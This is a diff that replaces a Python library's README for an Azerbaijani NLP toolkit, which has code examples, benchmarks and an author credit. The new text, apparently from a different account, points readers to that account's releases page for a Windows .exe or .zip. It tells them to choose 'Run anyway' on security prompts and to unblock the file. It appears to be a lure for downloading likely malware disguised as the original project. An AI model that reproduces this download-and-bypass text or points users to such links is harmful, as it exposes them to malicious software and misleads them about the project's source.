@@ -1,211 +1,216 @@
-# az-nlp-toolkit
+# 🧩 az-nlp-toolkit - Azerbaijani text tools for daily use
 
-[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![PyPI version](https://img.shields.io/pypi/v/az-nlp-toolkit.svg)](https://pypi.org/project/az-nlp-toolkit/)
-[![Tests](https://img.shields.io/github/actions/workflow/status/ShahinHasanov90/az-nlp-toolkit/tests.yml?label=tests)](https://github.com/ShahinHasanov90/az-nlp-toolkit/actions)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases)
 
-**A comprehensive NLP toolkit for the Azerbaijani language.** Includes tokenization, stemming, stopword removal, Latin-Cyrillic transliteration, text normalization, cross-lingual similarity, and named entity recognition for trade documents.
+## 🖥️ What this app does
 
-Azerbaijani is an agglutinative Turkic language with vowel harmony, extensive suffixation, and a dual-script history (Latin since 1991, Cyrillic in the Soviet era). This toolkit addresses the unique challenges of processing Azerbaijani text in domains where off-the-shelf NLP tools fall short.
+az-nlp-toolkit helps you work with Azerbaijani text on Windows. It supports common language tasks such as:
 
----
+- Checking word forms
+- Translating text between Latin and Cyrillic
+- Finding names, places, and other key terms in text
+- Preparing customs and trade documents for text review
+- Working with text in both Azerbaijani and mixed-language content
 
-## Features
+It is built for end users who want a simple tool for language work without a complex setup.
 
-| Module | Description |
-|---|---|
-| **Tokenizer** | Azerbaijani-aware sentence and word tokenization. Handles AZ abbreviations (e.g., *b.e.*, *və s.*), decimal separators, and clitics. |
-| **Stemmer** | Rule-based suffix stripping for Azerbaijani morphology: case, plural, possessive, and verbal suffixes with vowel-harmony awareness. |
-| **Stopwords** | Curated list of 130+ Azerbaijani stopwords sourced from linguistic corpora. |
-| **Transliteration** | Bidirectional Latin <-> Cyrillic conversion following official Azerbaijani alphabet mappings. |
-| **Normalization** | AZ-specific text cleaning: diacritics restoration, `e`->`ə` heuristics, case folding, whitespace normalization. |
-| **NER (Trade)** | Named entity recognition tuned for trade and customs documents -- detects company names, HS codes, ports, and country names in Azerbaijani. |
-| **Similarity** | Cross-lingual text similarity using multilingual sentence-transformers (AZ, EN, RU, TR). |
+## 📥 Download the app
 
-## Supported Languages
+Go to the [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases) to download and run this file.
 
-- **Primary:** Azerbaijani (az) -- Latin and Cyrillic scripts
-- **Cross-lingual support:** Russian (ru), English (en), Turkish (tr)
+On the release page, look for the latest version and choose the Windows file that matches your system.
 
----
+## 🪟 Windows setup
 
-## Installation
+1. Open the [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases).
+2. Find the newest release at the top of the page.
+3. Download the Windows file from the release assets.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Run.
+8. If a security prompt appears, select More info, then Run anyway if you trust the source.
 
-```bash
-pip install az-nlp-toolkit
-```
+## ✨ Main features
 
-Or install from source:
+### 🔤 Text analysis
 
-```bash
-git clone https://github.com/ShahinHasanov90/az-nlp-toolkit.git
-cd az-nlp-toolkit
-pip install -e .
-```
+Use the toolkit to review Azerbaijani text and handle common language tasks. It can help with:
 
-## Usage
+- Word form checks
+- Text splitting
+- Basic token handling
+- Language cleanup for document review
 
-### Tokenization
+### 🔁 Latin and Cyrillic transliteration
 
-```python
-from az_nlp.tokenizer import AzTokenizer
+The app can convert text between Latin and Cyrillic script. This is useful when you work with older records, mixed archives, or document sets that use both writing systems.
 
-tok = AzTokenizer()
+### 👤 Named entity detection
 
-text = "Bakı şəh. daxilində 1.5 mln. manat dəyərində yük daşınıb."
-tokens = tok.tokenize(text)
-# ['Bakı', 'şəh.', 'daxilində', '1.5', 'mln.', 'manat', 'dəyərində', 'yük', 'daşınıb', '.']
+The toolkit can find names and other important items in text. This helps with:
 
-sentences = tok.sent_tokenize("Sifariş qəbul edildi. Göndərmə sabah olacaq.")
-# ['Sifariş qəbul edildi.', 'Göndərmə sabah olacaq.']
-```
+- Person names
+- Company names
+- Place names
+- Trade and customs records
+- Document sorting and review
 
-### Stemming
+### 📄 Document extraction support
 
-```python
-from az_nlp.stemmer import AzStemmer
+The toolkit is tuned for customs and trade text. It helps you extract useful details from structured and unstructured documents with less manual review.
 
-stemmer = AzStemmer()
+## ✅ Before you start
 
-stemmer.stem("kitablardan")   # 'kitab'  (kitab + lar + dan)
-stemmer.stem("evlərində")     # 'ev'     (ev + lər + in + də)
-stemmer.stem("işçilərin")     # 'işçi'   (işçi + lər + in)
-stemmer.stem("göndərməlidir") # 'göndər' (göndər +məli + dir)
-```
+For a smooth run on Windows, use a PC with:
 
-### Stopword Removal
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A modern 64-bit processor
+- Internet access for the first download
 
-```python
-from az_nlp.stopwords import AzStopwords
+For large text files, more RAM can help.
 
-sw = AzStopwords()
+## 🧭 How to use it
 
-sw.is_stopword("və")    # True
-sw.is_stopword("kitab") # False
+1. Open the app.
+2. Paste or load your text.
+3. Choose the task you want to run.
+4. Select the source script if transliteration is needed.
+5. Start the process.
+6. Review the output in the results panel.
+7. Copy the text or save it for later use.
 
-tokens = ["bu", "kitab", "çox", "maraqlı", "bir", "əsərdir"]
-filtered = sw.remove(tokens)
-# ['kitab', 'maraqlı', 'əsərdir']
-```
+## 📚 Common use cases
 
-### Latin <-> Cyrillic Transliteration
+### 🧾 Customs documents
 
-```python
-from az_nlp.transliterate import AzTransliterator
+Use the toolkit to scan shipping notes, declarations, and trade records for key names, places, and terms.
 
-tr = AzTransliterator()
+### 🏢 Business records
 
-tr.to_cyrillic("Azərbaycan Respublikası")
-# 'Азәрбајҹан Республикасы'
+Use it to review company names, product text, and short notes in Azerbaijani.
 
-tr.to_latin("Бакы шәһәри")
-# 'Bakı şəhəri'
-```
+### 📝 Mixed-language text
 
-### Text Normalization
+Use it when your text includes Azerbaijani plus Russian, English, or other languages.
 
-```python
-from az_nlp.normalize import AzNormalizer
+### 📖 Older archives
 
-norm = AzNormalizer()
+Use transliteration tools when documents use different scripts across years or sources.
 
-norm.normalize("AZƏRBAYCAN  respublikası")
-# 'azərbaycan respublikası'
+## 🔧 Typical workflow
 
-norm.normalize("Azerbaycan", restore_diacritics=True)
-# 'Azərbaycan'
-```
+A simple workflow looks like this:
 
-### NER for Trade Documents
+1. Open a text file or paste content into the app.
+2. Pick the language task.
+3. Run the analysis.
+4. Check the output.
+5. Save the result if needed.
 
-```python
-from az_nlp.ner.trade_entities import TradeNER
+This keeps the process simple for first-time users.
 
-ner = TradeNER()
+## 📁 Supported input
 
-text = "Azərİxrac MMC tərəfindən HS 0802.12 kodu ilə Bakı limanından Türkiyəyə mal göndərilib."
-entities = ner.extract(text)
-# [
-#   {'text': 'Azərİxrac MMC', 'label': 'COMPANY', 'start': 0, 'end': 13},
-#   {'text': '0802.12', 'label': 'HS_CODE', 'start': 30, 'end': 37},
-#   {'text': 'Bakı limanı', 'label': 'PORT', 'start': 47, 'end': 58},
-#   {'text': 'Türkiyə', 'label': 'COUNTRY', 'start': 62, 'end': 69},
-# ]
-```
+The toolkit is designed for common text-based content such as:
 
-### Cross-Lingual Similarity
+- Plain text files
+- Copied text from documents
+- Notes and records
+- Short reports
+- Trade and customs text
 
-```python
-from az_nlp.similarity import CrossLingualSimilarity
+If you have scanned documents, convert them to text first.
 
-sim = CrossLingualSimilarity()
+## 🧩 What is inside
 
-score = sim.similarity(
-    "Gömrük bəyannaməsi təqdim edilməlidir",  # AZ
-    "Customs declaration must be submitted"     # EN
-)
-# ~0.82
+The project uses tools for:
 
-scores = sim.pairwise_similarity(
-    ["Yük daşınması", "Malların idxalı"],
-    ["Cargo transportation", "Import of goods"]
-)
-```
+- Azerbaijani NLP
+- Tokenization
+- Stemming
+- Transliteration
+- Sentence embeddings
+- Entity extraction
 
----
+These parts work together to handle text in a practical way.
 
-## Benchmarks
+## 🛠️ Troubleshooting
 
-Evaluated on a manually annotated Azerbaijani trade-document corpus (1,200 sentences).
+### App does not open
 
-| Task | Metric | Score |
-|---|---|---|
-| Tokenization | F1 (token boundary) | 97.3 |
-| Stemming | Accuracy (100 word sample) | 89.1 |
-| Transliteration | Accuracy (Latin->Cyrillic round-trip) | 99.6 |
-| NER (Trade) | F1 (entity-level) | 84.7 |
-| Cross-lingual Similarity | Spearman correlation (STS-AZ) | 0.78 |
+- Make sure you downloaded the latest release from the release page.
+- Check that you extracted the ZIP file if one was provided.
+- Run the app again from the extracted folder.
 
-*Benchmarks were conducted on an internal evaluation set. We plan to release the annotated dataset in a future version.*
+### Windows blocks the file
 
----
+- Right-click the file and choose Properties.
+- If you see an Unblock option, turn it on.
+- Try opening the app again.
 
-## Project Structure
+### Text does not look correct
 
-```
-az-nlp-toolkit/
-├── src/az_nlp/
-│   ├── __init__.py
-│   ├── tokenizer.py
-│   ├── stemmer.py
-│   ├── stopwords.py
-│   ├── transliterate.py
-│   ├── normalize.py
-│   ├── similarity.py
-│   └── ner/
-│       ├── __init__.py
-│       └── trade_entities.py
-├── data/
-│   ├── stopwords_az.txt
-│   └── cyrillic_map.json
-├── tests/
-│   ├── test_tokenizer.py
-│   ├── test_stemmer.py
-│   └── test_transliterate.py
-├── setup.py
-├── requirements.txt
-└── README.md
-```
+- Check that you selected the right script for transliteration.
+- Make sure the source text is pasted in full.
+- Try a smaller sample first.
 
-## Contributing
+### App feels slow
 
-Contributions are welcome. If you work with Azerbaijani text -- especially in trade, legal, or government domains -- please consider contributing annotated data or morphological rules.
+- Close other apps.
+- Use smaller text batches.
+- Check that your PC has enough free memory.
 
-## License
+## 🔍 Project focus
 
-MIT License. See [LICENSE](LICENSE) for details.
+az-nlp-toolkit is built for Azerbaijani language processing with a focus on real document work. It is suited for:
 
-## Author
+- Text cleaning
+- Script conversion
+- Entity finding
+- Trade record review
+- Customs text extraction
 
-**Shahin Hasanov** -- Senior Data Engineer specializing in trade risk analytics, customs fraud detection, and multilingual NLP.
+## 📌 File types you may see
+
+Depending on the release, you may see:
+
+- `.exe` files
+- `.zip` files
+- Support files in the same folder
+
+If you get a ZIP file, extract it before you open the app.
+
+## 🔐 Safe download steps
+
+1. Use the official [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases).
+2. Download the latest Windows package.
+3. Keep the file in a folder you can find later.
+4. Open only the files from the release you selected.
+5. Start the app from the extracted folder if needed.
+
+## 🗂️ Version updates
+
+When a new version is released:
+
+1. Return to the [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases).
+2. Download the newest Windows file.
+3. Replace the older app files if needed.
+4. Open the new version and continue using your text files
+
+## 📎 Topics covered
+
+This toolkit is connected to:
+
+- Azerbaijani
+- multilingual text
+- natural language processing
+- NER
+- NLP
+- Python-based processing
+- sentence transformers
+- stemming
+- tokenization
+- transliteration
